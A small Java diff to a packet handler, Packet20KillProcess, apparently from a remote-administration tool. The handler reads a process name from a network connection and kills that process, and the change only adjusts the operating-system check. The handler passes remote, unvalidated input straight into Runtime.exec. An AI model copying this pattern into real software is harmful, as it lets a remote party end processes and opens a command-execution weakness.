@@ -11,7 +11,7 @@ public class Packet20KillProcess extends AbstractIncomingPacket {
 		String process = Connection.readLine();
 
 		try {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				Runtime.getRuntime().exec(new String[] { "taskkill", "/f", "/im", process });
 			} else {
 				Runtime.getRuntime().exec("kill " + process);
